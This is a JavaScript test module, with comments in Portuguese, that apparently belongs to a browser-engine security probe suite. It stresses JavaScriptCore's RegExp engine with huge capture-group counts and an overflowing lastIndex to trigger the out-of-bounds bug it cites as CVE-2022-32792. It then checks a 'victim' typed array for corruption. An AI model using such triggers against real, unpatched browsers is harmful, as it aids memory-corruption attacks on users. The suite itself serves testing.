/**
 * SC_REGEXP_OVERFLOW.JS
 * Categoria : JS ENGINE — Integer Overflow / OOB Read
 * Alvo      : JSC RegExp match array / named capture groups
 * Técnica   : Constrói RegExps com número extremo de grupos de captura,
 *             listas de alternativas e lookbehind recursivo para
 *             pressionar o alocador de resultados do JSC. Um overflow
 *             no cálculo de `lastIndex` ou no tamanho do array de match
 *             pode resultar em OOB read/write no Butterfly.
 * Referência: CVE-2022-32792 (WebKit JSC RegExp OOB)
 */

export default {
    id:          'REGEXP_INT_OVERFLOW',
    category:    'JS ENGINE',
    risk:        'HIGH',
    description: 'RegExp com grupos extremos pressiona o alocador JSC. '
                + 'Testa overflow em lastIndex e tamanho do array de match.',

    /* ── estado interno ──────────────────────────────────────────────── */
    _re:          null,
    _reNamed:     null,
    _matchResult: null,
    _groups:      null,
    _victim:      null,

    supported: function() {
        try { new RegExp('(?<a>x)'); return true; }
        catch(_) { return false; }
    },

    /* ── setup ──────────────────────────────────────────────────────── */
    setup: async function() {
        this._matchResult = null;
        this._groups      = null;

        // Array vítima adjacente no heap
        this._victim = new Float64Array(16);
        this._victim.fill(1.1111111111111);

        // RegExp com muitos grupos de captura nomeados
        const namedGroups = Array.from({ length: 100 }, (_, i) => `(?<g${i}>\\w?)`).join('');
        try {
            this._reNamed = new RegExp(namedGroups + '(.*)');
        } catch(_) {}

        // RegExp com alternativas aninhadas profundas
        let altPattern = 'a';
        for (let i = 0; i < 12; i++) altPattern = `(${altPattern}|${'b'.repeat(i+1)})`;
        try {
            this._re = new RegExp(altPattern, 'g');
        } catch(_) {}

        await new Promise(r => setTimeout(r, 0));
    },

    /* ── trigger ─────────────────────────────────────────────────────── */
    trigger: async function() {
        // 1) Executa com string longa para pressionar o array de match
        const longStr = 'a'.repeat(10000) + 'b'.repeat(10000);
        try {
            this._matchResult = this._re?.exec(longStr) ?? null;
        } catch(_) {}

        // 2) Grupos nomeados com input huge
        try {
            const m = this._reNamed?.exec('x'.repeat(200));
            this._groups = m?.groups ? Object.keys(m.groups).length : 0;
        } catch(_) {}

        // 3) lastIndex overflow — define como 2^32-1 e executa
        try {
            const reSticky = /(\w+)/sy;
            reSticky.lastIndex = 0xFFFFFFFF;
            reSticky.exec('test overflow boundary');
        } catch(_) {}

        // 4) String.prototype.replace com função e muitos grupos
        try {
            const rReplace = /(\w)(\w)(\w)(\w)(\w)(\w)(\w)(\w)/g;
            'abcdefghijklmnopqrstuvwxyz'.repeat(400).replace(rReplace,
                (...args) => args.slice(1, -2).join('')
            );
        } catch(_) {}

        await new Promise(r => setTimeout(r, 0));
    },

    /* ── probes ──────────────────────────────────────────────────────── */
    probe: [
        // [0-4] resultado do match
        s => s._matchResult?.length ?? -1,
        s => typeof s._matchResult,
        s => s._matchResult?.[0]?.length ?? -1,
        s => s._matchResult?.index ?? -1,
        s => s._groups ?? -1,

        // [5-7] estado do RegExp após execução
        s => s._re?.lastIndex ?? -1,
        s => s._re?.source?.length ?? -1,
        s => typeof s._re,

        // [8-10] vítima Float64 — detecta OOB write silencioso
        s => s._victim[0],
        s => s._victim[8],
        s => s._victim[15],

        // [11-12] invariante do motor: RegExp puro não muda nada fora
        s => s._victim.byteLength,
        s => s._victim.every(v => Math.abs(v - 1.1111111111111) < 1e-10) ? 'clean' : 'CORRUPTED',
    ],

    /* ── cleanup ─────────────────────────────────────────────────────── */
    cleanup: async function() {
        this._re          = null;
        this._reNamed     = null;
        this._matchResult = null;
        this._groups      = null;
        this._victim      = null;
    }
};
